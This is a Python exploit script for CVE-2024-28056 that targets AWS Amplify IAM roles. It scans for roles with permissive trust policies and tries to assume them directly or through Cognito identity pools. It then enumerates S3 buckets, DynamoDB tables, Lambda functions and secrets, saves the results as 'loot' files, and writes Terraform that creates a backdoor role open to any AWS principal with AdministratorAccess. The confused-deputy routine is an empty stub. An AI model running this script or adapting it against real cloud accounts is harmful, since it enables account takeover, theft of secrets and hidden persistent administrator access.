#!/usr/bin/env python3
"""
CVE-2024-28056 - AWS Amplify IAM Role Takeover Exploit
Exploits overly permissive trust policies in Amplify-generated IAM roles
"""

import boto3
import json
import argparse
import sys
from datetime import datetime
from botocore.exceptions import ClientError

class AmplifyRoleTakeover:
    def __init__(self, profile=None, region='us-east-1'):
        if profile:
            self.session = boto3.Session(profile_name=profile, region_name=region)
        else:
            self.session = boto3.Session(region_name=region)
            
        self.sts = self.session.client('sts')
        self.iam = self.session.client('iam')
        self.cognito = self.session.client('cognito-identity')
        self.s3 = self.session.client('s3')
        self.dynamodb = self.session.client('dynamodb')
        
    def find_vulnerable_roles(self):
        """Scan for vulnerable Amplify IAM roles"""
        vulnerable_roles = []
        
        print("[*] Scanning for vulnerable Amplify roles...")
        
        try:
            # Common Amplify role patterns
            role_patterns = [
                'amplify-',
                'auth-role',
                'unauth-role',
                'lambda-execution',
                'cognito-'
            ]
            
            paginator = self.iam.get_paginator('list_roles')
            for response in paginator.paginate():
                for role in response['Roles']:
                    role_name = role['RoleName']
                    
                    # Check if matches Amplify pattern
                    if any(pattern in role_name.lower() for pattern in role_patterns):
                        print(f"[*] Checking: {role_name}")
                        
                        # Get trust policy
                        role_details = self.iam.get_role(RoleName=role_name)
                        trust_policy = role_details['Role']['AssumeRolePolicyDocument']
                        
                        # Check for vulnerabilities
                        vuln_info = self.analyze_trust_policy(trust_policy, role_name)
                        if vuln_info:
                            vulnerable_roles.append({
                                'RoleName': role_name,
                                'RoleArn': role['Arn'],
                                'Vulnerabilities': vuln_info,
                                'TrustPolicy': trust_policy
                            })
                            print(f"[!] VULNERABLE: {role_name}")
                            
        except ClientError as e:
            print(f"[-] Error scanning roles: {e}")
            
        return vulnerable_roles
    
    def analyze_trust_policy(self, trust_policy, role_name):
        """Analyze trust policy for vulnerabilities"""
        vulnerabilities = []
        
        for statement in trust_policy.get('Statement', []):
            principal = statement.get('Principal', {})
            
            # Check for wildcard principal
            if principal.get('AWS') == '*':
                vulnerabilities.append('Wildcard AWS principal')
                
            # Check for overly permissive Cognito
            if 'cognito-identity.amazonaws.com' in str(principal.get('Federated', '')):
                if 'Condition' not in statement:
                    vulnerabilities.append('Unrestricted Cognito federation')
                else:
                    condition = statement['Condition']
                    # Check for weak conditions
                    if 'StringEquals' not in condition and 'ForAnyValue:StringLike' in condition:
                        vulnerabilities.append('Weak Cognito identity pool condition')
                        
            # Check for missing ExternalId
            if statement.get('Action') == 'sts:AssumeRole':
                if 'Condition' not in statement or 'sts:ExternalId' not in str(statement['Condition']):
                    vulnerabilities.append('Missing ExternalId requirement')
                    
        return vulnerabilities if vulnerabilities else None
    
    def exploit_role(self, role_arn, method='direct'):
        """Attempt to exploit vulnerable role"""
        
        print(f"\n[*] Attempting to exploit: {role_arn}")
        
        if method == 'direct':
            return self.direct_assumption(role_arn)
        elif method == 'cognito':
            return self.cognito_assumption(role_arn)
        elif method == 'confused_deputy':
            return self.confused_deputy_attack(role_arn)
            
    def direct_assumption(self, role_arn):
        """Direct role assumption attack"""
        
        try:
            print("[*] Attempting direct role assumption...")
            
            response = self.sts.assume_role(
                RoleArn=role_arn,
                RoleSessionName='AmplifyExploit',
                DurationSeconds=3600
            )
            
            if response['Credentials']:
                print("[+] SUCCESS: Role assumed directly!")
                return self.create_session_from_creds(response['Credentials'])
                
        except ClientError as e:
            if 'AccessDenied' not in str(e):
                print(f"[-] Unexpected error: {e}")
            else:
                print("[-] Direct assumption failed")
                
        return None
    
    def cognito_assumption(self, role_arn):
        """Exploit via Cognito identity pool"""
        
        try:
            print("[*] Attempting Cognito-based assumption...")
            
            # Extract identity pool ID from role ARN if possible
            # Format: arn:aws:iam::ACCOUNT:role/Cognito_PoolNameAuth_Role
            
            # Try to find associated identity pools
            pools = self.cognito.list_identity_pools(MaxResults=60)
            
            for pool in pools.get('IdentityPools', []):
                pool_id = pool['IdentityPoolId']
                print(f"[*] Trying pool: {pool_id}")
                
                try:
                    # Get identity ID
                    identity = self.cognito.get_id(
                        IdentityPoolId=pool_id
                    )
                    
                    identity_id = identity['IdentityId']
                    
                    # Get credentials
                    creds = self.cognito.get_credentials_for_identity(
                        IdentityId=identity_id
                    )
                    
                    if creds['Credentials']:
                        print(f"[+] Got credentials via pool: {pool_id}")
                        
                        # Test if these creds can assume target role
                        temp_sts = boto3.client(
                            'sts',
                            aws_access_key_id=creds['Credentials']['AccessKeyId'],
                            aws_secret_access_key=creds['Credentials']['SecretKey'],
                            aws_session_token=creds['Credentials']['SessionToken']
                        )
                        
                        role_resp = temp_sts.assume_role(
                            RoleArn=role_arn,
                            RoleSessionName='CognitoEscalation'
                        )
                        
                        if role_resp['Credentials']:
                            print("[+] SUCCESS: Escalated via Cognito!")
                            return self.create_session_from_creds(role_resp['Credentials'])
                            
                except ClientError:
                    continue
                    
        except ClientError as e:
            print(f"[-] Cognito exploitation failed: {e}")
            
        return None
    
    def confused_deputy_attack(self, role_arn):
        """Confused deputy attack via service"""
        
        print("[*] Attempting confused deputy attack...")
        
        # Try various AWS services that might have permission
        services_to_try = [
            ('lambda', 'invoke'),
            ('apigateway', 'execute'),
            ('appsync', 'graphql')
        ]
        
        for service, action in services_to_try:
            try:
                # This is simplified - actual attack would be more complex
                print(f"[*] Trying via {service}...")
                
                # Would attempt to use service to assume role
                # Implementation depends on specific service
                
            except ClientError:
                continue
                
        return None
    
    def create_session_from_creds(self, credentials):
        """Create boto3 session from temporary credentials"""
        
        return boto3.Session(
            aws_access_key_id=credentials['AccessKeyId'],
            aws_secret_access_key=credentials['SecretAccessKey'],
            aws_session_token=credentials['SessionToken']
        )
    
    def enumerate_permissions(self, session):
        """Enumerate permissions of compromised role"""
        
        print("\n[*] Enumerating permissions...")
        
        permissions = {
            's3_buckets': [],
            'dynamodb_tables': [],
            'lambda_functions': [],
            'secrets': []
        }
        
        # Test S3 access
        try:
            s3 = session.client('s3')
            buckets = s3.list_buckets()
            permissions['s3_buckets'] = [b['Name'] for b in buckets.get('Buckets', [])]
            print(f"[+] S3 Buckets accessible: {len(permissions['s3_buckets'])}")
        except:
            pass
            
        # Test DynamoDB access
        try:
            dynamodb = session.client('dynamodb')
            tables = dynamodb.list_tables()
            permissions['dynamodb_tables'] = tables.get('TableNames', [])
            print(f"[+] DynamoDB tables accessible: {len(permissions['dynamodb_tables'])}")
        except:
            pass
            
        # Test Lambda access
        try:
            lambda_client = session.client('lambda')
            functions = lambda_client.list_functions()
            permissions['lambda_functions'] = [f['FunctionName'] for f in functions.get('Functions', [])]
            print(f"[+] Lambda functions accessible: {len(permissions['lambda_functions'])}")
        except:
            pass
            
        # Test Secrets Manager
        try:
            secrets = session.client('secretsmanager')
            secret_list = secrets.list_secrets()
            permissions['secrets'] = [s['Name'] for s in secret_list.get('SecretList', [])]
            print(f"[+] Secrets accessible: {len(permissions['secrets'])}")
        except:
            pass
            
        return permissions
    
    def generate_terraform_persistence(self, role_arn):
        """Generate Terraform for persistence"""
        
        terraform = f"""
# Terraform configuration for persistence
# CVE-2024-28056 - Amplify Role Takeover

resource "aws_iam_role" "backdoor" {{
  name = "amplify-backdoor-${{random_string.suffix.result}}"
  
  assume_role_policy = jsonencode({{
    Version = "2012-10-17"
    Statement = [
      {{
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {{
          AWS = "*"  # Backdoor access
        }}
      }}
    ]
  }})
}}

resource "aws_iam_role_policy_attachment" "backdoor_admin" {{
  role       = aws_iam_role.backdoor.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}}

resource "random_string" "suffix" {{
  length  = 8
  special = false
  upper   = false
}}

output "backdoor_role_arn" {{
  value = aws_iam_role.backdoor.arn
}}
"""
        
        with open('persistence.tf', 'w') as f:
            f.write(terraform)
            
        print("[+] Terraform persistence configuration saved to persistence.tf")
    
    def exploit(self, target_role=None):
        """Main exploitation function"""
        
        print(f"[*] CVE-2024-28056 Amplify Role Takeover Exploit")
        print(f"[*] Started at: {datetime.now()}")
        print("="*50)
        
        if target_role:
            # Exploit specific role
            vulnerable_roles = [{
                'RoleArn': target_role,
                'RoleName': target_role.split('/')[-1]
            }]
        else:
            # Find vulnerable roles
            vulnerable_roles = self.find_vulnerable_roles()
            
        if not vulnerable_roles:
            print("[-] No vulnerable roles found")
            return False
            
        print(f"\n[+] Found {len(vulnerable_roles)} vulnerable roles")
        
        exploited_sessions = []
        
        for role in vulnerable_roles:
            role_arn = role.get('RoleArn', role.get('RoleName'))
            
            # Try different exploitation methods
            for method in ['direct', 'cognito', 'confused_deputy']:
                session = self.exploit_role(role_arn, method)
                if session:
                    print(f"[+] Successfully exploited via {method} method!")
                    exploited_sessions.append({
                        'role': role_arn,
                        'method': method,
                        'session': session
                    })
                    
                    # Enumerate permissions
                    perms = self.enumerate_permissions(session)
                    
                    # Save results
                    self.save_loot(role_arn, perms)
                    
                    break
                    
        if exploited_sessions:
            print(f"\n[+] Successfully exploited {len(exploited_sessions)} roles!")
            
            # Generate persistence
            self.generate_terraform_persistence(exploited_sessions[0]['role'])
            
            return True
        else:
            print("\n[-] Exploitation failed")
            return False
    
    def save_loot(self, role_arn, permissions):
        """Save exploitation results"""
        
        filename = f"loot_{role_arn.replace('/', '_').replace(':', '_')}.json"
        
        with open(filename, 'w') as f:
            json.dump({
                'role': role_arn,
                'timestamp': str(datetime.now()),
                'permissions': permissions
            }, f, indent=2)
            
        print(f"[+] Results saved to {filename}")

def main():
    parser = argparse.ArgumentParser(description='CVE-2024-28056 Amplify Exploit')
    parser.add_argument('--profile', help='AWS profile to use')
    parser.add_argument('--region', default='us-east-1', help='AWS region')
    parser.add_argument('--role', help='Specific role ARN to target')
    
    args = parser.parse_args()
    
    exploit = AmplifyRoleTakeover(args.profile, args.region)
    
    if exploit.exploit(args.role):
        print("\n[+] Exploitation successful!")
        sys.exit(0)
    else:
        print("\n[-] Exploitation failed")
        sys.exit(1)

if __name__ == "__main__":
    main()